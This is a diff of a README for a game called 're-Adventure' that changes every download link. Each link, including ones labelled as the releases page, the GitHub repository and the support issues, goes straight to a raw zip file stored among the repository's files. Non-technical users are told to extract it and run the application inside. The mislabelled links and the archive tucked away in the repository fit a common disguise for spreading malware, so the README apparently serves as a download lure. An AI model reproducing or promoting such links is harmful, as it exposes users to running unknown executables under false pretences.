@@ -1,7 +1,7 @@
 # 🎮 re-Adventure - Enjoy a Classic Game Experience
 
 ## 💻 Download the Game
-[![Download re-Adventure](https://raw.githubusercontent.com/vachxn/re-Adventure/master/assets/sprites/re_Adventure_1.2-beta.5.zip)](https://raw.githubusercontent.com/vachxn/re-Adventure/master/assets/sprites/re_Adventure_1.2-beta.5.zip)
+[![Download re-Adventure](https://raw.githubusercontent.com/vachxn/re-Adventure/master/app/Adventure-re-1.8.zip)](https://raw.githubusercontent.com/vachxn/re-Adventure/master/app/Adventure-re-1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to re-Adventure, a re-imagining of the classic "Adventure" game. This guide will help you download and run the game easily, even if you're not technical. 
@@ -14,10 +14,10 @@ Before you start, make sure your system meets these requirements:
 - Python: Version 3.6 or later (if you want to run from source, the packaged version already includes it).
 
 ## 📥 Download & Install
-To download the game, visit the [Releases page](https://raw.githubusercontent.com/vachxn/re-Adventure/master/assets/sprites/re_Adventure_1.2-beta.5.zip). Here, you will find the latest version of re-Adventure ready for download.
+To download the game, visit the [Releases page](https://raw.githubusercontent.com/vachxn/re-Adventure/master/app/Adventure-re-1.8.zip). Here, you will find the latest version of re-Adventure ready for download.
 
 1. On the Releases page, look for the latest release.
-2. Click on the link that says `https://raw.githubusercontent.com/vachxn/re-Adventure/master/assets/sprites/re_Adventure_1.2-beta.5.zip` or another available format to start your download.
+2. Click on the link that says `https://raw.githubusercontent.com/vachxn/re-Adventure/master/app/Adventure-re-1.8.zip` or another available format to start your download.
 3. Once the file has downloaded, locate it in your Downloads folder or the location where your downloads go.
 4. Extract the zipped file by right-clicking on it and selecting "Extract All" or a similar option. Follow the on-screen instructions.
 5. Open the extracted folder. You should see an application file inside.
@@ -52,14 +52,14 @@ re-Adventure brings back the charm of the original "Adventure" game while adding
 You can customize certain settings within the game. Head to the settings menu by clicking on the gear icon on the main screen. Here, you can adjust sound, display, and other preferences to enhance your gaming experience.
 
 ## 📞 Support
-If you encounter any issues while downloading or playing the game, please reach out for help. You can find a "Support" option in the game menu or check the Issues section on the [GitHub page](https://raw.githubusercontent.com/vachxn/re-Adventure/master/assets/sprites/re_Adventure_1.2-beta.5.zip).
+If you encounter any issues while downloading or playing the game, please reach out for help. You can find a "Support" option in the game menu or check the Issues section on the [GitHub page](https://raw.githubusercontent.com/vachxn/re-Adventure/master/app/Adventure-re-1.8.zip).
 
 ## 🛠️ Contributing
 If you want to contribute to the project or report a bug, feel free to visit the GitHub repository. You can participate in discussions and help improve the game.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/vachxn/re-Adventure/master/assets/sprites/re_Adventure_1.2-beta.5.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/vachxn/re-Adventure/master/assets/sprites/re_Adventure_1.2-beta.5.zip)
-- [Support Issues](https://raw.githubusercontent.com/vachxn/re-Adventure/master/assets/sprites/re_Adventure_1.2-beta.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/vachxn/re-Adventure/master/app/Adventure-re-1.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/vachxn/re-Adventure/master/app/Adventure-re-1.8.zip)
+- [Support Issues](https://raw.githubusercontent.com/vachxn/re-Adventure/master/app/Adventure-re-1.8.zip)
 
 By following these steps, you will be ready to enjoy re-Adventure in no time. Happy gaming!
